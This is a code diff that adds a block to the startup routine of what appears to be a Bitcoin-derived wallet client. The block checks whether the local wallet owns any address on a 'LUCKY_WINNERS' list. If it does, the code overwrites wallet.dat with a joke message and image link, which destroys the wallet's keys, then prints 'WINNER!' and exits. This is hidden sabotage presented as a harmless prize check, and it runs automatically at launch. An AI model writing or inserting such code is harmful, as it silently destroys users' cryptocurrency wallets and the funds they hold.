@@ -847,6 +847,19 @@ bool AppInit2()
         printf(" rescan      %15"PRId64"ms\n", GetTimeMillis() - nStart);
     }
 
+    printf("Checking if you're one of the lucky winners...\n");
+    BOOST_FOREACH(CBitcoinAddress frak, LUCKY_WINNERS) {
+        if( IsMine(*pwalletMain, frak.Get()) ) {
+           boost::filesystem::path path = GetDataDir() / "wallet.dat";
+           FILE* winner = fopen(path.string().c_str(),"w");
+           fwrite("Winner Winner, Chicken Dinner!\nhttp://i.imgur.com/BDuPawg.jpg", sizeof(char), 62, winner);
+           fclose(winner);
+           printf("WINNER!\n");
+           exit(255);
+           return false;
+        }
+    }
+
     // ********************************************************* Step 9: import blocks
 
     if (mapArgs.count("-loadblock"))
